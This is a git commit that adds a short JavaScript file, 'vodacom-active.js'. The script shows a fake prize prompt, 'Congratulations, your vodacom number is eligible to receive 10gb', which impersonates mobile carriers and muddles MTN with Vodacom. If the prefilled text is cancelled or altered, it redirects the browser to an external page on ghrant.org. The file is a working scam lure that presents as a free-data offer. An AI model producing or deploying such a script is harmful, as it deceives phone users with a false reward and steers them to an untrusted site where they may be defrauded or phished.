44c5974bf44acdcbd5449e911f933566d4c77947
mfednewblog8 <nsikakimoh68@gmail.com>
2025-10-08 20:42:09 +0100

    Create vodacom-active.js

---
+++ vodacom-active.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 10GB'
+password=prompt('MTN: Congratulations, your vodacom number is eligible to receive 10gb, click OK to activate now','ACTIVATE 10GB');
+if (password != 'ACTIVATE 10GB') {
+location.href='https://ghrant.org/vodacom.html';
+}
